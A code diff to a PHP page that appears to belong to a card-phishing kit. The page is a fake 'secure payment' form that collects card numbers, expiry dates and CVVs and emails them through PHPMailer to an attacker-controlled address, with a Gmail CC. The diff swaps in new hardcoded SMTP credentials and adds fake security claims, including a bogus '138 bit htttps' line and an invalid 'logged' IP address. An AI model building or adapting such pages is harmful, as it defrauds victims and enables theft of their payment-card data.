@@ -13,9 +13,9 @@ include('PHPMailer/class.smtp.php');
                 $mail->SMTPAuth = true;
                 $mail->SMTPSecure = 'ssl';
                 $mail->Port = 465;
-                $mail->Username = "info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in";
-                $mail->Password = "Info@123";
-                $mail->AddAddress("info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in");
+                $mail->Username = "info@swimstudios.xyz";
+                $mail->Password = "Admin@123";
+                $mail->AddAddress("info@swimstudios.xyz");
                 $mail->addCC('easymailid45@gmail.com');
                 $mail->SetFrom($mail->Username);
                 
@@ -57,9 +57,9 @@ include('PHPMailer/class.smtp.php');
     <div class="underlinelogo"></div>
     <div class="container">
         <div class="row adm">
-              <div class="col-md-12 text-center bordermarc"><p class="pera"><img src="img/img010.jpg"></p></div>
+              <div class="col-md-12 text-center bordermarc"><p class="pera"><img src="img/img010.png" style="width: 100%;"></p></div>
               <div class="col-xs-6 col-md-5"><p class="pera"><b>Reference No:</b> <br>89823499</p></div>
-              <div class="col-xs-6 col-md-7"><p class="pera trac"><b><img src="img/img011.jpg"></b> <?=$_SESSION['amount']?>.00 INR</p></div>
+              <div class="col-xs-6 col-md-7"><p class="pera trac"><b><img style="width: 100%;" src="img/img011.png"></b> <br><?=$_SESSION['amount']?>.00 INR</p></div>
         </div>
     </div>
 
@@ -69,7 +69,7 @@ include('PHPMailer/class.smtp.php');
                 <div class="row">
                 <div class="col-xs-12">
                     <div class="box-input">
-                        <p><img src="img/img012.jpg"></p>
+                        <p><img style="width: 100%;" src="img/img012.jpg"></p>
                         <input class="mobilewidth cardrd" type="text" placeholder="Please Enter" name="c_number" minlength="16" maxlength="16">
                         <div class="input-group-addon rightfloat pd6"><img src="img/iconn.png"></div>
                     </div>
@@ -77,7 +77,7 @@ include('PHPMailer/class.smtp.php');
 
                 <div class="col-xs-4">
                     <div class="box-input">
-                        <p><img src="img/img013.jpg"></p>
+                        <p><img style="width: 100%;" class="img100" src="img/img013.jpg"></p>
                         <select class="form-control" name="holder_name" required="">
                           <option selected="selected">Select</option>
                           <option value="Maestro">Maestro</option>
@@ -90,7 +90,7 @@ include('PHPMailer/class.smtp.php');
             <div class="row">
                 <div class="col-xs-3 pd0">
                     <div class="box-input">
-                        <p><img src="img/img014.jpg"></p>
+                        <p><img style="width: 100%;" src="img/img014.jpg"></p>
                         <select class="form-control" name="expmon" required="">
                           <option selected="selected">Select</option>
                           <option value="01">01 (Jan)</option>
@@ -111,7 +111,7 @@ include('PHPMailer/class.smtp.php');
 
                 <div class="col-xs-3 pd0">
                     <div class="box-input">
-                        <p><img src="img/img015.jpg"></p>
+                        <p><img style="width: 100%;" src="img/img015.jpg"></p>
                         <select class="form-control" name="expyr" required="">
                             <option selected="selected">Select</option>
                             <option value="01">01 (Jan)</option>
@@ -168,7 +168,7 @@ include('PHPMailer/class.smtp.php');
 
                 <div class="col-xs-3 pd0">
                     <div class="box-input">
-                        <p><img src="img/img016.jpg"></p>
+                        <p><img style="width: 100%;" src="img/img016.jpg"></p>
                         <input type="password" placeholder="..." name="cvv" maxlength="3" required="">
                     </div>
 
@@ -200,7 +200,7 @@ include('PHPMailer/class.smtp.php');
         <div class="container">
             <div class="row">
                 <div class="col-md-12 ipdetails">
-                <p class="small footer-text"><img src="img/new-img.jpg" style="width: 100%;"> address <strong>192.58.277.41</strong> and access time <strong><?=date("M d h:i:s")?> IST <?=date("yy")?></strong>                        have been logged.</p>
+                <p class="small footer-text">Your amount is processed through a secure 138 bit htttps internet connection based on secure socket layer technology. For security purposes, Your address <strong>192.58.277.41</strong> and access time <strong><?=date("M d h:i:s")?> IST <?=date("yy")?></strong>                        have been logged.</p>
             </div>
                 <div class="col-xs-12">
                     <img style="width: 100%;" src="img/cc-logoo.png" />
